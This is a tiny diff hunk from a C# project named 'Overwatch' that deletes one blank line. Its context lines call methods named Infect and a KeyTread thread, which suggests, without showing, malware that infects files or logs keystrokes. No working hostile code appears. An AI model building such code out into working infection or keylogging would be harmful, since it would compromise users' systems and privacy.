@@ -19,7 +19,6 @@ namespace Overwatch
         {
             try
             {
-
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
                 KeyTread.Start();
